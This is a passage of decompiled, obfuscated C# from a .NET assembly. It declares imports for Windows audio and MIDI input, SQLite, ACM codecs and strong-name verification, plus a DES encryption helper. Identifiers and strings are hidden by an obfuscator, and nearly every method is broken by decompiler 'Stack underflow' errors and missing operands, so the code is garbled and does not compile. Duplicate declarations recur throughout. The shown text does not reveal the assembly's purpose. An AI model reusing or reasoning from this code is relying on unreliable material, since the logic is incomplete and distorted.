					_ = ((MediaType)/*Error near IL_000f: Stack underflow*/).AverageBytesPerSecond;
					return /*Error near IL_0006: Stack underflow*/* 8;
				})
					.Distinct()
				orderby (int)/*Error near IL_0003: Stack underflow*/
				select _0002).ToArray();
		}

		[DllImport("Msacm32.dll", EntryPoint = "acmStreamOpen")]
		static extern MmResult _0001(out IntPtr _0002, IntPtr _0003, IntPtr _0004, IntPtr _0005, [In] global::_0017._0012 _0006, IntPtr _0007, IntPtr _0008, global::_0007._000F _000E);

		[ReflectionPermission(SecurityAction.Assert, MemberAccess = true)]
		static object _0001(global::_0017._0082 P_0)
		{
			//IL_00dc: Incompatible stack heights: 0 vs 1
			//IL_00e6: Incompatible stack heights: 0 vs 1
			if (global::_0017._0082._0001 == null)
			{
				_0080._0014._0001(107349819);
				_0018._0001((string)/*Error near IL_00e6: Stack underflow*/, (string)null);
				string text = (string)/*Error near IL_00ec: Stack underflow*/;
				Version version = _008E._007E_001B_0004(_001B_0004._007E_0087_0008(_0092._007E_0081_0004(_001D_0003._009D_0006(P_0))));
				text = ((text == null) ? _0018._0001((IFormatProvider)_008F_0003._008B_0007(), global::_0017._0082._0001, new object[1] { version }) : _0018._0001((IFormatProvider)_008F_0003._008B_0007(), text, new object[1] { version }));
				Type type = _0096_0004._001E_000E(text, false);
				if ((object)type != null)
				{
					FieldInfo fieldInfo = _0080_0006._007E_0016_0010(type, _0080._0014._0001(107349230), global::_0017._0082._0001);
					if ((object)fieldInfo != null)
					{
						global::_0017._0082._0001 = _0086_0004._007E_0098_0008(fieldInfo, null);
					}
				}
			}
			return global::_0017._0082._0001;
		}

		[DllImport("SQLite.Interop.dll", CallingConvention = CallingConvention.Cdecl, EntryPoint = "sqlite3_column_count")]
		static extern int _0001(IntPtr _0002);

		static void _0001(_001D._0014 _0002, float P_1)
		{
			//IL_0007: Invalid comparison between Unknown and F4
			//IL_0055: Incompatible stack heights: 0 vs 1
			//IL_0058: Incompatible stack heights: 0 vs 1
			//IL_005b: Incompatible stack heights: 0 vs 1
			if (!((float)/*Error near IL_0009: Stack underflow*/ >= 1E-09f))
			{
				P_1 = 1E-09f;
			}
			((_001D._0014)/*Error near IL_0019: Stack underflow*/)._000F = (float)/*Error near IL_0019: Stack underflow*/;
			_0002._0011 = (_0002._0008 - _0002._000F) * (1f - _0002._0006);
			_0002._0012 = (0f - _0002._000F) * (1f - _0002._0007);
		}

		static long _0001(_001A._0018 P_0)
		{
			//IL_0026: Incompatible stack heights: 0 vs 2
			//IL_002d: Incompatible stack heights: 0 vs 1
			//IL_0030: Incompatible stack heights: 0 vs 1
			_ = _0090_0002._009A_0005;
			IntPtr intPtr = ((_001A._0018)/*Error near IL_000c: Stack underflow*/)._0001;
			IntPtr zero = IntPtr.Zero;
			/*Error near IL_002d: Stack underflow*/(intPtr, zero);
			if ((int)/*Error near IL_0015: Stack underflow*/ != 0)
			{
				return 0L;
			}
			return _0018._0001(((_001A._0018)/*Error near IL_001f: Stack underflow*/)._0001);
		}

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		static void _0001(global::_0001._0010 P_0)
		{
			//IL_0017: Incompatible stack heights: 0 vs 1
			//IL_001e: Incompatible stack heights: 0 vs 1
			//IL_0025: Incompatible stack heights: 0 vs 1
			_0018._0001(((global::_0001._0010)/*Error near IL_0007: Stack underflow*/)._0001);
			_0080._0014._0001(107349217);
			_0018._0001((MmResult)/*Error near IL_0015: Stack underflow*/, (string)/*Error near IL_0015: Stack underflow*/);
		}

		static void _0001(string _0002, global::_0017._0080 P_1)
		{
			//IL_0034: Incompatible stack heights: 0 vs 1
			//IL_003e: Incompatible stack heights: 0 vs 1
			if (0 == 0)
			{
				_0018._0001((global::_0017._0080)/*Error near IL_003b: Stack underflow*/);
			}
			byte[] obj = (global::_001C._0096_0003(_0002) ? null : _0087_0003._007E_0081_0007(_0082_0002._0088_0005(), _0002));
			_0018._0001((global::_0017._0080)/*Error near IL_0032: Stack underflow*/, obj);
		}

		static _0080._0017 _0001(bool _0002)
		{
			//IL_0030: Incompatible stack heights: 0 vs 1
			//IL_0037: Incompatible stack heights: 0 vs 1
			_0080._0017 obj = _0080._0017._0002;
			if ((int)/*Error near IL_0007: Stack underflow*/ != 0)
			{
				_0018._0001();
				if ((int)/*Error near IL_000b: Stack underflow*/ != 0)
				{
					if (obj == _0080._0017._0002)
					{
						obj = _0018._0001(1u, (string)null);
					}
					if (obj == _0080._0017._0002)
					{
						obj = _0018._0001(2u, (string)null);
					}
				}
			}
			if (obj == _0080._0017._0002)
			{
				obj = _0018._0001();
			}
			return obj;
		}

		static global::_0017._0017 _0001(int _0002, int _0003)
		{
			//IL_000b: Unknown result type (might be due to invalid IL or missing references)
			//IL_000d: Unknown result type (might be due to invalid IL or missing references)
			//IL_0015: Expected I4, but got Unknown
			//IL_0017: Incompatible stack heights: 0 vs 1
			//IL_0021: Incompatible stack heights: 0 vs 2
			_0018._0001((int)/*Error near IL_001e: Stack underflow*/);
			_ = 192;
			return new global::_0017._0017(/*Error near IL_000c: Stack underflow*/ + /*Error near IL_000c: Stack underflow*/- 1, _0002, 0);
		}

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		[DllImport("SQLite.Interop.dll", CallingConvention = CallingConvention.Cdecl, EntryPoint = "sqlite3_exec")]
		static extern _0080._0017 _0001(IntPtr _0002, byte[] _0003, IntPtr _0004, IntPtr _0005, ref IntPtr _0006);

		unsafe static void _0001(byte[] _0002, int _0003, byte[] _0004, int _0005)
		{
			//IL_004a: Incompatible stack heights: 0 vs 1
			//IL_004d: Incompatible stack heights: 0 vs 1
			fixed (byte* ptr = &((byte[])/*Error near IL_0005: Stack underflow*/)[/*Error near IL_0005: Stack underflow*/])
			{
				fixed (byte* ptr3 = &_0002[0])
				{
					float* ptr2 = (float*)ptr;
					float* ptr4 = (float*)ptr3;
					int num = _0003 / 4;
					for (int i = 0; i < num; i++)
					{
						ptr2[i] += ptr4[i];
					}
				}
			}
		}

		[DllImport("SQLite.Interop.dll", CallingConvention = CallingConvention.Cdecl, EntryPoint = "sqlite3_interrupt")]
		static extern void _0001(IntPtr _0002);

		[DllImport("winmm.dll", EntryPoint = "waveInReset")]
		static extern MmResult _0001(IntPtr _0002);

		static _0014 _0001(global::_0010._001C P_0)
		{
			//IL_000e: Incompatible stack heights: 0 vs 1
			//IL_0018: Incompatible stack heights: 0 vs 2
			_0018._0001((global::_0010._001C)/*Error near IL_0015: Stack underflow*/);
			_ = 0;
			return _0018._0001((CommandBehavior)/*Error near IL_000c: Stack underflow*/, (global::_0010._001C)/*Error near IL_000c: Stack underflow*/);
		}

		unsafe static void _0001(int _0002, ref Dictionary<_0014._0001, List<int>> _0003, ref Dictionary<int, _0014._0001> _0004, global::_0013._0017 _0005, _0013 _0006)
		{
			//IL_00ca: Incompatible stack heights: 0 vs 1
			//IL_00d0: Incompatible stack heights: 0 vs 1
			//IL_00da: Incompatible stack heights: 0 vs 1
			if (*(object*)(nint)/*Error near IL_0006: Stack underflow*/ == null)
			{
				new _0014._0001();
				Dictionary<_0014._0001, List<int>> dictionary = new Dictionary<_0014._0001, List<int>>((IEqualityComparer<_0014._0001>?)/*Error near IL_0017: Stack underflow*/);
				*(Dictionary<_0014._0001, List<int>>*)(nint)/*Error near IL_0018: Stack underflow*/ = dictionary;
			}
			if (_0004 == null)
			{
				_0004 = new Dictionary<int, _0014._0001>();
			}
			for (int i = 0; i < _0002; i++)
			{
				string text = _0006._0003(_0005, i);
				string text2 = _0006._0004(_0005, i);
				string text3 = _0006._0002(_0005, i);
				_0014._0001 key = new _0014._0001(text, text2, null);
				_0014._0001 value = new _0014._0001(text, text2, text3);
				if (!_0003.TryGetValue(key, out var value2))
				{
					_0003.Add(key, new List<int>(new int[1] { i }));
				}
				else if (value2 != null)
				{
					value2.Add(i);
				}
				else
				{
					_0003[key] = new List<int>(new int[1] { i });
				}
				_0004.Add(i, value);
			}
		}

		static ICryptoTransform _0001(byte[] _0002, bool _0003, byte[] _0004)
		{
			//IL_001e: Incompatible stack heights: 0 vs 1
			//IL_0031: Incompatible stack heights: 0 vs 1
			new DESCryptoServiceProvider();
			using DESCryptoServiceProvider dESCryptoServiceProvider = /*Error near IL_0034: Stack underflow*/;
			return ((int)/*Error near IL_0008: Stack underflow*/ != 0) ? dESCryptoServiceProvider.CreateDecryptor(_0004, _0002) : dESCryptoServiceProvider.CreateEncryptor(_0004, _0002);
		}

		static void _0001(global::_0016._0012 P_0)
		{
			//IL_000c: Incompatible stack heights: 0 vs 1
			//IL_0013: Incompatible stack heights: 0 vs 1
			_0018._0001(((global::_0016._0012)/*Error near IL_0007: Stack underflow*/)._0001);
		}

		[DllImport("SQLite.Interop.dll", CallingConvention = CallingConvention.Cdecl, EntryPoint = "sqlite3_bind_int64")]
		static extern _0080._0017 _0001(IntPtr _0002, int _0003, ulong _0004);

		[DllImport("winmm.dll", EntryPoint = "midiInReset")]
		static extern MmResult _0001(IntPtr _0002);

		[DllImport("Msacm32.dll", EntryPoint = "acmDriverEnum")]
		static extern MmResult _0001(global::_0008._0008._0001 _0002, IntPtr _0003, global::_000F._0008 _0004);

		static DbType _0001(Type _0002)
		{
			//IL_0044: Incompatible stack heights: 0 vs 2
			//IL_004b: Incompatible stack heights: 0 vs 1
			_ = _009D_0004._0086_000E;
			/*Error near IL_004b: Stack underflow*/((Type)/*Error near IL_004b: Stack underflow*/);
			TypeCode typeCode = (TypeCode)/*Error near IL_004e: Stack underflow*/;
			if (typeCode == TypeCode.Object)
			{
				if ((object)_0002 == _0091._0080_0004(typeof(byte[]).TypeHandle))
				{
					return DbType.Binary;
				}
				if ((object)_0002 == _0091._0080_0004(typeof(Guid).TypeHandle))
				{
					return DbType.Guid;
				}
				return DbType.String;
			}
			return global::_0001._001A._0001[(int)typeCode];
		}

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		[DllImport("winmm.dll", CharSet = CharSet.Ansi, EntryPoint = "mixerGetDevCaps")]
		static extern MmResult _0001(IntPtr _0002, ref global::_0015._0003._0002 _0003, int _0004);

		static void _0001(global::_0017._0080 _0002, byte[] P_1)
		{
			//IL_002c: Incompatible stack heights: 0 vs 1
			//IL_0036: Incompatible stack heights: 0 vs 1
			_0018._0001((global::_0017._0080)/*Error near IL_0033: Stack underflow*/);
			if (((global::_0017._0080)/*Error near IL_000b: Stack underflow*/)._0001 != ConnectionState.Open)
			{
				throw new InvalidOperationException(_0080._0014._0001(107349232));
			}
			_0002._0001._0002(P_1);
		}

		static void _0001(float _0002 = 0.693f, global::_000E._0019 _0003 = 0.707f, float P_2)
		{
			//IL_0013: Incompatible stack heights: 0 vs 1
			//IL_0016: Incompatible stack heights: 0 vs 1
			//IL_0019: Incompatible stack heights: 0 vs 1
			((global::_000E._0019)/*Error near IL_0009: Stack underflow*/)._0002 = (float)/*Error near IL_0009: Stack underflow*/;
			((global::_000E._0019)/*Error near IL_0011: Stack underflow*/)._0001 = _0002;
		}

		static void _0001(global::_0014._0008 _0002)
		{
			//IL_004b: Incompatible stack heights: 0 vs 2
			//IL_0052: Incompatible stack heights: 0 vs 1
			//IL_0059: Incompatible stack heights: 0 vs 1
			_ = _0090_0002._009A_0005;
			IntPtr intPtr = ((global::_0014._0008)/*Error near IL_000c: Stack underflow*/)._0003;
			IntPtr zero = IntPtr.Zero;
			/*Error near IL_0052: Stack underflow*/(intPtr, zero);
			if ((int)/*Error near IL_0015: Stack underflow*/ != 0)
			{
				_0080._0014._0001(107349127);
				throw new ArgumentException((string?)/*Error near IL_0021: Stack underflow*/);
			}
			MmResult num = _0018._0001(_0002._0001, 0);
			_0018._0001(_0002._0003);
			_0018._0001(num, _0080._0014._0001(107349038));
		}

		static int _0001(global::_0017._007F._0003 P_0)
		{
			//IL_000c: Unknown result type (might be due to invalid IL or missing references)
			//IL_000e: Expected I4, but got Unknown
			//IL_000f: Incompatible stack heights: 0 vs 2
			_ = 32768;
			int num = ((global::_0017._007F._0003)/*Error near IL_000c: Stack underflow*/)._0004;
			return /*Error near IL_000d: Stack underflow*/- num;
		}

		static void _0001(global::_000E._0016 _0002, MediaFoundationEncoder _0003, int _0004, _001C._0004 P_3)
		{
			//IL_003b: Incompatible stack heights: 0 vs 1
			//IL_0042: Incompatible stack heights: 0 vs 1
			_ = ((_001C._0004)/*Error near IL_0042: Stack underflow*/).WaveFormat;
			byte[] array = new byte[((global::_0005._0005)/*Error near IL_0009: Stack underflow*/)._0002 * 4];
			_0002._0001();
			long num = 0L;
			long num2 = 0L;
			do
			{
				num2 = _0018._0001(_0003, _0002, _0004, P_3, num, array);
				num += num2;
			}
			while (num2 > 0);
			_0002._0002();
		}

		static bool _0001(DataTable _0002, _001D._0019 P_1)
		{
			//IL_0089: Incompatible stack heights: 0 vs 3
			//IL_0093: Incompatible stack heights: 0 vs 1
			//IL_009d: Incompatible stack heights: 0 vs 1
			_ = _0081_0006._007E_0017_0010;
			_ = _0002_0005._007E_008B_000E;
			/*Error near IL_0093: Stack underflow*/((object)/*Error near IL_0093: Stack underflow*/);
			string isKey = SchemaTableColumn.IsKey;
			/*Error near IL_009d: Stack underflow*/((object)/*Error near IL_009d: Stack underflow*/, isKey);
			DataColumn dataColumn = (DataColumn)/*Error near IL_001c: Stack underflow*/;
			IEnumerator enumerator = _0014_0005._007E_009B_000E(_0006_0005._007E_008F_000E(_0002));
			try
			{
				while (global::_001B._007E_0086_0003(enumerator))
				{
					DataRow dataRow = (DataRow)_0083_0003._007E_001D_0007(enumerator);
					if ((bool)_0082_0006._007E_0018_0010(dataRow, dataColumn))
					{
						return true;
					}
				}
			}
			finally
			{
				if (enumerator is IDisposable disposable)
				{
					global::_0008._007E_0098(disposable);
				}
			}
			return false;
		}

		static SortedList<string, string> _0001(string _0002, bool _0003)
		{
			//IL_0009: Incompatible stack heights: 0 vs 1
			//IL_000c: Incompatible stack heights: 0 vs 1
			//IL_0013: Incompatible stack heights: 0 vs 1
			_0018._0001((string)/*Error near IL_0013: Stack underflow*/, (byte)/*Error near IL_0013: Stack underflow*/ != 0, (global::_0017._0080)null);
			return (SortedList<string, string>)/*Error near IL_0008: Stack underflow*/;
		}

		static void _0001()
		{
			_0018._0001();
			global::_0015._0016.Log -= global::_0015._0016._0002;
		}

		[DllImport("winmm.dll", CharSet = CharSet.Ansi, EntryPoint = "mixerGetNumDevs")]
		static extern int _0001();

		static bool _0001(global::_0017._007F._0001 P_0)
		{
			//IL_0015: Unknown result type (might be due to invalid IL or missing references)
			//IL_0047: Expected I4, but got Unknown
			//IL_01cd: Incompatible stack heights: 0 vs 1
			//IL_01d9: Incompatible stack heights: 0 vs 1
			int num = ((global::_0017._007F._0001)/*Error near IL_000a: Stack underflow*/)._0013;
			switch (/*Error near IL_0016: Stack underflow*/ - 2)
			{
			case 0:
			{
				if (P_0._0001)
				{
					P_0._0013 = 12;
					return false;
				}
				int num2 = _0018._0001(P_0._0001, 3);
				if (num2 < 0)
				{
					return false;
				}
				_0018._0001(P_0._0001, 3);
				if (((uint)num2 & (true ? 1u : 0u)) != 0)
				{
					P_0._0001 = true;
				}
				switch (num2 >> 1)
				{
				case 0:
					_0018._0001(P_0._0001);
					P_0._0013 = 3;
					break;
				case 1:
					P_0._0001 = global::_0017._007F._0004._0001;
					P_0._0002 = global::_0017._007F._0004._0002;
					P_0._0013 = 7;
					break;
				case 2:
					P_0._0001 = new global::_0017._007F._0005();
					P_0._0013 = 6;
					break;
				}
				return true;
			}
			case 1:
				if ((P_0._0017 = _0018._0001(P_0._0001, 16)) < 0)
				{
					return false;
				}
				_0018._0001(P_0._0001, 16);
				P_0._0013 = 4;
				goto case 2;
			case 2:
				if (_0018._0001(P_0._0001, 16) < 0)
				{
					return false;
				}
				_0018._0001(P_0._0001, 16);
				P_0._0013 = 5;
				goto case 3;
			case 3:
			{
				int num3 = _0018._0001(P_0._0001, P_0._0001, P_0._0017);
				P_0._0017 -= num3;
				if (P_0._0017 == 0)
				{
					P_0._0013 = 2;
					return true;
				}
				return !P_0._0001.IsNeedingInput;
			}
			case 4:
				if (!_0018._0001(P_0._0001, P_0._0001))
				{
					return false;
				}
				P_0._0001 = _0018._0001(P_0._0001);
				P_0._0002 = _0018._0001(P_0._0001);
				P_0._0013 = 7;
				goto case 5;
			case 5:
			case 6:
			case 7:
			case 8:
				return _0018._0001(P_0);
			case 10:
				return false;
			default:
				return false;
			}
		}

		unsafe static bool _0001(object _0002, ref object _0003, [Out] string _0004)
		{
			//IL_001e: Incompatible stack heights: 0 vs 1
			//IL_0021: Incompatible stack heights: 0 vs 1
			//IL_0024: Incompatible stack heights: 0 vs 2
			if (global::_0017._0080._0001 == null)
			{
				*(_003F*)(nint)/*Error near IL_000c: Stack underflow*/ = /*Error near IL_000c: Stack underflow*/;
				return false;
			}
			_ = global::_0017._0080._0001;
			return _0018._0001((global::_0017._0080)/*Error near IL_001c: Stack underflow*/, (string)/*Error near IL_001c: Stack underflow*/, _0002, ref _0003);
		}

		static bool _0001(global::_0015._0013 _0002, global::_0006._0012 P_1)
		{
			//IL_004a: Incompatible stack heights: 0 vs 1
			//IL_004d: Incompatible stack heights: 0 vs 1
			for (int i = 0; i < _0002.Count; i++)
			{
				global::_0006._0012 obj = _0018._0001((global::_0015._0013)/*Error near IL_000e: Stack underflow*/, (int)/*Error near IL_000e: Stack underflow*/);
				if (_0094_0002._0004_0006(obj._0001, P_1._0001) && obj._0001 == P_1._0001)
				{
					return true;
				}
			}
			return false;
		}

		static short _0001(byte[] _0002)
		{
			//IL_001d: Incompatible stack heights: 0 vs 1
			//IL_0024: Incompatible stack heights: 0 vs 1
			//IL_002b: Incompatible stack heights: 0 vs 1
			if (((Array)/*Error near IL_0003: Stack underflow*/).Length != 2)
			{
				_0080._0014._0001(107349049);
				new Exception((string?)/*Error near IL_002b: Stack underflow*/);
				throw /*Error near IL_0011: Stack underflow*/;
			}
			return (short)((_0002[0] << 8) | _0002[1]);
		}

		static int _0001(global::_0005._0005 _0002, int P_1)
		{
			//IL_0015: Unknown result type (might be due to invalid IL or missing references)
			//IL_0038: Incompatible stack heights: 0 vs 1
			//IL_003b: Incompatible stack heights: 0 vs 2
			_ = (double)((global::_0005._0005)/*Error near IL_0007: Stack underflow*/)._0002 / 1000.0;
			double num = (double)/*Error near IL_0015: Stack underflow*/;
			int num2 = (int)(/*Error near IL_0016: Stack underflow*/ * num);
			if (num2 % _0002.BlockAlign != 0)
			{
				num2 = num2 + _0002.BlockAlign - num2 % _0002.BlockAlign;
			}
			return num2;
		}

		[DllImport("SQLite.Interop.dll", CallingConvention = CallingConvention.Cdecl, EntryPoint = "sqlite3_backup_pagecount")]
		static extern int _0001(IntPtr _0002);

		static void _0001(Delegate _0002, string _0003, Type _0004, Delegate _0005, global::_0016._001C _0006, int _0007)
		{
			//IL_002b: Incompatible stack heights: 0 vs 1
			//IL_002f: Incompatible stack heights: 0 vs 1
			//IL_0033: Incompatible stack heights: 0 vs 1
			_0019._007F obj = new _0019._007F((string)/*Error near IL_000b: Stack underflow*/, (int)/*Error near IL_000b: Stack underflow*/, (global::_0016._001C)/*Error near IL_000b: Stack underflow*/);
			obj._0001 = _0004;
			obj._0001 = _0005;
			obj._0002 = _0002;
			_0018._0001((object)null, obj);
		}

		static void _0001(SQLiteConnectionFlags _0002, string _0003, DbType _0004)
		{
			//IL_0008: Unknown result type (might be due to invalid IL or missing references)
			//IL_000f: Invalid comparison between Unknown and I8
			//IL_0045: Incompatible stack heights: 0 vs 1
			//IL_004c: Incompatible stack heights: 0 vs 2
			//IL_0053: Incompatible stack heights: 0 vs 1
			if ((long)(/*Error near IL_0009: Stack underflow*/ & 0x8000) == 32768)
			{
				_ = _0015_0004._001E_0008;
				_008F_0003._008C_0007();
				_0080._0014._0001(107349012);
				string obj2 = _0018._0001(_0004: new object[2] { _0003, _0004 }, _0002: (IFormatProvider)/*Error near IL_003e: Stack underflow*/, _0003: (string)/*Error near IL_003e: Stack underflow*/);
				/*Error near IL_0043: Stack underflow*/(obj2);
			}
		}

		static void _0001(int _0002, global::_000E._001F _0003, string _0004)
		{
			//IL_00a0: Incompatible stack heights: 0 vs 1
			//IL_00ac: Incompatible stack heights: 0 vs 1
			_0018._0001();
			global::_0007._001B obj = (global::_0007._001B)/*Error near IL_00a6: Stack underflow*/;
			if ((int)/*Error near IL_0011: Stack underflow*/ != 0)
			{
				obj._0001(_0004, _0003, _0002);
				return;
			}
			object obj2;
			_0091_0002._009C_0005(obj2 = global::_0007._001C._0001);
			try
			{
				if (global::_0007._001C._0001.TryGetValue(_0004, out var value) && _0002 == value._0001)
				{
					_0018._0001(value, _0003: true);
					Queue<WeakReference> queue = value._0001;
					if (queue == null)
					{
						return;
					}
					queue.Enqueue(new WeakReference(_0003, trackResurrection: false));
					_0006_0003._0084_0006(ref global::_0007._001C._0003);
				}
				else
				{
					global::_0008._007E_001F_0002(_0003);
				}
				_0091_0002._009E_0005(_0003);
			}
			finally
			{
				_0091_0002._009D_0005(obj2);
			}
		}

		static float _0001(float _0002, float _0003)
		{
			//IL_0011: Unknown result type (might be due to invalid IL or missing references)
			//IL_0014: Unknown result type (might be due to invalid IL or missing references)
			//IL_0018: Unsupported input type for neg.
			//IL_0018: Unknown result type (might be due to invalid IL or missing references)
			//IL_001b: Unknown result type (might be due to invalid IL or missing references)
			//IL_0021: Expected F8, but got Unknown
			//IL_0024: Incompatible stack heights: 0 vs 4
			//IL_0027: Incompatible stack heights: 0 vs 2
			//IL_002e: Incompatible stack heights: 0 vs 1
			_ = global::_0015._009E_0002;
			_ = global::_0015._009D_0002;
			_ = 1f;
			_ = /*Error near IL_0012: Stack underflow*/+ /*Error near IL_0012: Stack underflow*/;
			_003F val = /*Error near IL_0015: Stack underflow*// /*Error near IL_0015: Stack underflow*/;
			/*Error near IL_002e: Stack underflow*/((double)val);
			_003F val2 = (0 - /*Error near IL_0019: Stack underflow*/) / (double)_0002;
			return (float)/*Error near IL_0021: Stack underflow*/((double)val2);
		}

		static byte[] _0001(IEnumerable<byte[]> _0002)
		{
			//IL_0074: Incompatible stack heights: 0 vs 1
			//IL_007e: Incompatible stack heights: 0 vs 1
			int num = 0;
			((IEnumerable<byte[]>)/*Error near IL_007e: Stack underflow*/).GetEnumerator();
			using (IEnumerator<byte[]> enumerator = /*Error near IL_0008: Stack underflow*/)
			{
				while (enumerator.MoveNext())
				{
					byte[] current = enumerator.Current;
					num += current.Length;
				}
			}
			return _0018._0001(new byte[4][]
			{
				Encoding.UTF8.GetBytes(_0080._0014._0001(107349427)),
				new byte[2] { 3, 0 },
				new byte[1],
				_0018._0001(num)
			});
		}

		[DllImport("SQLite.Interop.dll", CallingConvention = CallingConvention.Cdecl, EntryPoint = "sqlite3_errcode")]
		static extern _0080._0017 _0001(IntPtr _0002);

		static long _0001(global::_000F._0005 _0002, long P_1)
		{
			//IL_0011: Unknown result type (might be due to invalid IL or missing references)
			//IL_001e: Unknown result type (might be due to invalid IL or missing references)
			//IL_001f: Unknown result type (might be due to invalid IL or missing references)
			//IL_0031: Unknown result type (might be due to invalid IL or missing references)
			//IL_0032: Unknown result type (might be due to invalid IL or missing references)
			//IL_0037: Incompatible stack heights: 0 vs 1
			//IL_003a: Incompatible stack heights: 0 vs 1
			//IL_0041: Incompatible stack heights: 0 vs 1
			_ = ((global::_000F._0005)/*Error near IL_0009: Stack underflow*/)._0001.WaveFormat;
			int num = ((global::_0005._0005)/*Error near IL_0010: Stack underflow*/)._0002;
			_003F val = /*Error near IL_0012: Stack underflow*/* num / _0002._0001._0002;
			return val - val % _0002._0001.WaveFormat.BlockAlign;
		}

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		static byte[] _0001(int _0002)
		{
			//IL_0011: Incompatible stack heights: 0 vs 2
			//IL_0018: Incompatible stack heights: 0 vs 1
			_ = _0012_0003._008E_0006;
			Array.Reverse((Array)/*Error near IL_000c: Stack underflow*/((int)/*Error near IL_000c: Stack underflow*/));
			return (byte[])/*Error near IL_0010: Stack underflow*/;
		}

		static void _0001(global::_0010._007F P_0)
		{
			//IL_0024: Incompatible stack heights: 0 vs 1
			//IL_002b: Incompatible stack heights: 0 vs 2
			//IL_0032: Incompatible stack heights: 0 vs 1
			if (((global::_0010._007F)/*Error near IL_0007: Stack underflow*/)._0001)
			{
				_ = global::_0002._007E_0016;
				_0091._0080_0004(typeof(global::_0010._007F).TypeHandle);
				/*Error near IL_0032: Stack underflow*/((object)/*Error near IL_0032: Stack underflow*/);
				throw new ObjectDisposedException((string?)/*Error near IL_0021: Stack underflow*/);
			}
		}

		static void _0001(_001B._0004 _0002, _001E._0004 _0003, int P_2)
		{
			//IL_0020: Incompatible stack heights: 0 vs 2
			//IL_0023: Incompatible stack heights: 0 vs 1
			//IL_0026: Incompatible stack heights: 0 vs 1
			_ = 0;
			if (!_0018._0001((global::_0017._0005)/*Error near IL_000c: Stack underflow*/, (_001B._0004)/*Error near IL_000c: Stack underflow*/, (_001E._0004)/*Error near IL_000c: Stack underflow*/, (int)/*Error near IL_000c: Stack underflow*/))
			{
				throw new ArgumentException(_0080._0014._0001(107355700));
			}
		}

		static bool _0001(global::_0017._0080 _0002, string P_1)
		{
			//IL_002d: Incompatible stack heights: 0 vs 1
			//IL_0037: Incompatible stack heights: 0 vs 1
			if (0 == 0)
			{
				_0018._0001((global::_0017._0080)/*Error near IL_0034: Stack underflow*/);
			}
			if (((global::_0017._0080)/*Error near IL_000d: Stack underflow*/)._0001 == null)
			{
				throw new InvalidOperationException(_0080._0014._0001(107349390));
			}
			return _0002._0001._0001(P_1);
		}

		[DllImport("winmm.dll", EntryPoint = "waveOutGetVolume")]
		static extern MmResult _0001(IntPtr _0002, out int _0003);

		[DllImport("winmm.dll", EntryPoint = "midiInPrepareHeader")]
		static extern MmResult _0001(IntPtr _0002, [MarshalAs(UnmanagedType.Struct)] ref global::_0018._0012._0007 _0003, int _0004);

		static void _0001(_001F._0019 P_0)
		{
			//IL_0052: Incompatible stack heights: 0 vs 1
			//IL_0055: Incompatible stack heights: 0 vs 1
			((_001F._0019)/*Error near IL_0008: Stack underflow*/)._0001 = false;
			if (((_001F._0019)/*Error near IL_000f: Stack underflow*/)._0001 == null)
			{
				return;
			}
			for (int i = 0; i < P_0._0001.Length; i++)
			{
				if (P_0._0001[i]._0001 != null)
				{
					P_0._0001[i]._0001.IsValid = false;
				}
			}
		}

		[DllImport("winmm.dll", EntryPoint = "midiOutUnprepareHeader")]
		static extern MmResult _0001(IntPtr _0002, [MarshalAs(UnmanagedType.Struct)] ref global::_0018._0012._0007 _0003, int _0004);

		static MediaType _0001(int _0002, Guid _0003, global::_0005._0005 _0004)
		{
			//IL_0097: Incompatible stack heights: 0 vs 1
			//IL_00a3: Incompatible stack heights: 0 vs 1
			new MediaFoundationEncoder._0002();
			MediaFoundationEncoder._0002 CS_0024_003C_003E8__locals0 = (MediaFoundationEncoder._0002)/*Error near IL_009d: Stack underflow*/;
			((MediaFoundationEncoder._0002)/*Error near IL_0015: Stack underflow*/)._0001 = _0004;
			CS_0024_003C_003E8__locals0._0001 = _0002;
			return Enumerable.Select(_0018._0001(_0003).Where(delegate(MediaType _0002)
			{
				//IL_0010: Invalid comparison between Unknown and I4
				//IL_0029: Incompatible stack heights: 0 vs 1
				//IL_0030: Incompatible stack heights: 0 vs 1
				//IL_0033: Incompatible stack heights: 0 vs 1
				_ = ((MediaType)/*Error near IL_0030: Stack underflow*/).SampleRate;
				int num2 = ((MediaFoundationEncoder._0002)/*Error near IL_000b: Stack underflow*/)._0001._0001;
				return (int)/*Error near IL_0012: Stack underflow*/ == num2 && _0002.ChannelCount == CS_0024_003C_003E8__locals0._0001._0001;
			}), delegate
			{
				//IL_0012: Unknown result type (might be due to invalid IL or missing references)
				//IL_0018: Expected I4, but got Unknown
				//IL_001f: Incompatible stack heights: 0 vs 1
